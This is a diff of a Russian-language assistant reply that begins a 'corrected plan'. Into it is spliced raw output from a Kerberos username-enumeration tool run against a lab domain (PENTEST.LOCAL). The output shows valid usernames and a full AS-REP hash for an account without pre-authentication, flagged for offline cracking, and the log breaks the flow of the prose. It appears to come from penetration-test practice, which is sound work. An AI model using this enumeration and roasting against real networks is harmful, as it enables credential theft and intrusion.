@@ -1,5 +1,23 @@
 Ты абсолютно прав. Вот **исправленный план** с правильной документацией:
+2026/08/05 04:00:34 > Using KDC(s):
+2026/08/05 04:00:34 > 10.0.20.5:88
 
+2026/08/05 04:00:54 > [+] svc_backupagent has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$18$svc_backupagent@PENTEST.LOCAL:4947d600fe36
+65a5b0772cbb85022274f085db5a1d8266a8935acedd52b03436ab
+fd3d3dbf37c14eb28b2f2759f975abb74564ee2bff2262c2142943f8
+111766d191e02e628bf80ffd5f5ab11708d0ec27ef215274bf9de9f94
+b616d7bfca8bae2a4488c5e22d39298698ce339fbf8a82c4491a8a405
+f60abe284ed70a641148c5635667ea5305833ec593ebd9802b998b4d
+b2c448e32552bf2ce3336aa385609acfdfb9f0469368ddaaafe67405
+f9ab8711c9690caa4b8306f432637a7d59f82006d4a26aafef6721c
+0e3d4b8e9b67e7ab697a3f5486ce66a7a40ecc8394ef9d69a0879c17
+08ca0d59969a2062d94582f177045b50eedb2a81b0149bf83a9c3814
+927b48d2c4c9c92274c22274b32a99e26
+2026/08/05 04:00:54 > [+] VALID USERNAME: svc_backupagent@PENTEST.LOCAL
+2026/08/05 04:00:54 > [+] VALID USERNAME: alice.johnson@PENTEST.LOCAL
+2026/08/05 04:00:54 > [+] VALID USERNAME: carol.white@PENTEST.LOCAL
+2026/08/05 04:00:54 > Done! Tested 5 usernames (3 valid) in 0.004 seconds
 ---
 
 ## ⚡ Сначала — создаём файл юзеров:
